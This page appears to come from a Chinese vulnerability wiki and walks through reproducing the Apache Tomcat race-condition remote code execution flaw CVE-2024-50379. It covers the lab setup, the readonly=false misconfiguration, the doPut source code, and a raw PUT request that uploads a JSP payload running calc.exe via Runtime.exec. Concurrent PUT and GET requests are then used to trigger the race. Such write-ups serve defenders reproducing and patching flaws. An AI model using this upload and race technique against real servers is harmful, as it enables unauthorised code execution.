<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache/Apache-Tomcat%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2024-50379%29/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache-Tomcat条件竞争致远程代码执行漏洞(CVE-2024-50379) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache-Tomcat\u6761\u4ef6\u7ade\u4e89\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2024-50379)", url: "#_top", children: [
          ]},
          {title: "\u73af\u5883\u642d\u5efa", url: "#_1", children: [
          ]},
          {title: "\u6f0f\u6d1e\u5206\u6790", url: "#_2", children: [
          ]},
          {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3", children: [
              {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache_Solr%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%28CVE-2023-50290%29/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache_Solr%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%28CVE-2023-50290%29/" class="btn btn-xs btn-link">
        Apache Solr环境变量信息泄漏漏洞(CVE 2023 50290)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache-Tomcat%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%28-CVE-2024-21733%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache-Tomcat%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%28-CVE-2024-21733%29/" class="btn btn-xs btn-link">
        Apache Tomcat存在信息泄露漏洞( CVE 2024 21733)
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-tomcatcve-2024-50379">Apache-Tomcat条件竞争致远程代码执行漏洞(CVE-2024-50379)<a class="headerlink" href="#apache-tomcatcve-2024-50379" title="Permanent link">&para;</a></h1>
<p>最近爆出 Apache Tomcat条件竞争导致的RCE，影响范围当然是巨大的，公司也及时收到了相关情报，于是老大让我复现，以更好的帮助公司进行修复漏洞。</p>
<p>复现难度其实并不大，但是成功率很低，我在复现过程中也尝试了很多tomcat、java版本，操作一样但结果不同，相信很多师傅也在复现，希望能够成功，所以我对“成功率”进行了一点点研究，希望能够提高师傅们复现成功的概率。</p>
<h1 id="_1">环境搭建<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
<p>经过多次的尝试，建议大家使用java8不要用太高的java版本 否则难以复现成功（关注后台回复20241219可以获取跟我一样的漏洞复现环境和POC）这里使用的环境如下：</p>
<div class="highlight"><pre><span></span><code>jre1.8.0_202
apache-tomcat-9.0.63
</code></pre></div>
<p><strong>windows虚拟机</strong></p>
<p>配置环境变量</p>
<p>这里一定要配置JAVA_HOME否则会报错</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311105830.webp" /></p>
<p>需要将这个版本的java的环境变量置顶，防止其他版本的干扰，大家应该都明白</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311105783.webp" /></p>
<p>配置CATALINA_BASE</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311105591.webp" /></p>
<p>这下环境变量就已经配置齐了 这个时候就已经可以正常启动tomcat了 运行这个批处理文件</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311105836.webp" /></p>
<p>启动成功（乱码无所谓的 web.xml改一下GBK即可）</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311105215.webp" /></p>
<h1 id="_2">漏洞分析<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
<p>影响版本</p>
<p>11.0.0-M1 &lt;= Apache Tomcat &lt; 11.0.2</p>
<p>10.1.0-M1 &lt;= Apache Tomcat &lt; 10.1.34</p>
<p>9.0.0.M1 &lt;= Apache Tomcat &lt; 9.0.98</p>
<p>漏洞原理</p>
<p>首先来看看著名的**CVE-2017-12615**，我们查看tomocat的配置 (conf/web.xml)</p>
<div class="highlight"><pre><span></span><code>    &lt;!-- The mapping for the default servlet --&gt;
    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;

    &lt;!-- The mappings for the JSP servlet --&gt;
    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;
        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;
        &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
</code></pre></div>
<p>当请求的后缀为jsp或jspx的时候交由JSP servlet进行处理请求，此外交给default servlet进行处理请求。而我们查看**CVE-2017-12615**的payload可知，它对文件后缀采取了一些绕过，例如PUT一个1.jsp/、1.jsp空格、1.jsp%00从而绕过JSP servlet的限制，让default servlet来处理请求。当default servlet处理PUT请求时如下图</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311105069.webp" /></p>
<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="nd">@Override</span>
<span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doPut</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span>
<span class="w">        </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">readOnly</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">sendNotAllowed</span><span class="p">(</span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">resp</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getRelativePath</span><span class="p">(</span><span class="n">req</span><span class="p">);</span>

<span class="w">        </span><span class="n">WebResource</span><span class="w"> </span><span class="n">resource</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resources</span><span class="p">.</span><span class="na">getResource</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>

<span class="w">        </span><span class="n">Range</span><span class="w"> </span><span class="n">range</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parseContentRange</span><span class="p">(</span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">resp</span><span class="p">);</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">range</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// Processing error. parseContentRange() set the error code</span>
<span class="w">            </span><span class="k">return</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="n">InputStream</span><span class="w"> </span><span class="n">resourceInputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>

<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// Append data specified in ranges to existing content for this</span>
<span class="w">            </span><span class="c1">// resource - create a temp. file on the local filesystem to</span>
<span class="w">            </span><span class="c1">// perform this operation</span>
<span class="w">            </span><span class="c1">// Assume just one range is specified for now</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">range</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">IGNORE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">resourceInputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">File</span><span class="w"> </span><span class="n">contentFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">executePartialPut</span><span class="p">(</span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">range</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="p">);</span>
<span class="w">                </span><span class="n">resourceInputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">contentFile</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">resources</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="n">resourceInputStream</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">resource</span><span class="p">.</span><span class="na">exists</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="n">resp</span><span class="p">.</span><span class="na">setStatus</span><span class="p">(</span><span class="n">HttpServletResponse</span><span class="p">.</span><span class="na">SC_NO_CONTENT</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="n">resp</span><span class="p">.</span><span class="na">setStatus</span><span class="p">(</span><span class="n">HttpServletResponse</span><span class="p">.</span><span class="na">SC_CREATED</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">resp</span><span class="p">.</span><span class="na">sendError</span><span class="p">(</span><span class="n">HttpServletResponse</span><span class="p">.</span><span class="na">SC_CONFLICT</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">resourceInputStream</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="n">resourceInputStream</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">ioe</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="c1">// Ignore</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>
<p>会去检查配置文件中的readonly的值是否为false，如果是true的话就直接return也就是不允许put请求，所以我们需要在配置文件中进行如下设置 (conf/web.cml) 注意是default servlet，因为上面讲了我们最终处理put请求是default servlet</p>
<div class="highlight"><pre><span></span><code>  &lt;servlet&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;

        &lt;init-param&gt;
            &lt;param-name&gt;debug&lt;/param-name&gt;
            &lt;param-value&gt;0&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;listings&lt;/param-name&gt;
            &lt;param-value&gt;false&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;readonly&lt;/param-name&gt;
            &lt;param-value&gt;false&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
</code></pre></div>
<p>最终就可以进行put上传shell了，这个就是**CVE-2017-12615**。</p>
<p>那么再看看最近很火的CVE-2024-50379。原理是条件竞争，通过并发put文件上传非标准后缀的“jsp”，并不断发起get请求一个标准后最的“jsp”文件，最终由于服务器的大小写不敏感，导致请求成功造成RCE。</p>
<p>看看pyload是put一个xxx.Jsp（也可以PUT html........），为什么长这样呢？阅读了上文，固然就明白了。 当然是要绕过jsp servlet的后缀匹配规则了然后让default servlet去处理请求。</p>
<p>现在我们尝试PUT一下 数据包如下</p>
<div class="highlight"><pre><span></span><code>PUT /test.Jsp HTTP/1.1
Host: 192.168.19.135:8080

&lt;% Runtime.getRuntime().exec(&quot;calc.exe&quot;);%&gt;
</code></pre></div>
<p>返回状态码是201代表上传成功 可以去webapps/ROOT目录看到</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311105018.webp" /></p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311106320.webp" /></p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311106484.webp" /></p>
<p>再次重放请求的时候就是204的状态码了  说明文件已经存在</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311106218.webp" /></p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311106369.webp" /></p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311106865.webp" /></p>
<h1 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
<p>接下来开始复现该漏洞 我用的是window虚拟机 而不是真机，因为我电脑内存太大，可能效果不会很明显，毕竟要用到条件竞争，所以如果想成功率高一点建议用虚拟机，把内核、内存大小设置小一点。</p>
<p>yakit-发送到webFuzzer 发三个  get的并发线程建议大于前面两个</p>
<p>第一个</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311106981.webp" /></p>
<p>第二个</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311106377.webp" /></p>
<p>第三个 </p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311106855.webp" /></p>
<p>开弹</p>
<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311106630.webp" /></p>
<p>在我虚拟机卡的时候往往容易成功 有时候直接用yakit就能成功，有时候不行，所以我同时用yakit和脚步一起打 </p>
<h2 id="_4">漏洞来源<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://mp.weixin.qq.com/s/d7dneaUgF2TD2KGdT1qiQw">https://mp.weixin.qq.com/s/d7dneaUgF2TD2KGdT1qiQw</a></li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache_Solr%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%28CVE-2023-50290%29/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache_Solr%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%28CVE-2023-50290%29/" class="btn btn-xs btn-link">
        Apache Solr环境变量信息泄漏漏洞(CVE 2023 50290)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache-Tomcat%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%28-CVE-2024-21733%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache-Tomcat%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%28-CVE-2024-21733%29/" class="btn btn-xs btn-link">
        Apache Tomcat存在信息泄露漏洞( CVE 2024 21733)
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>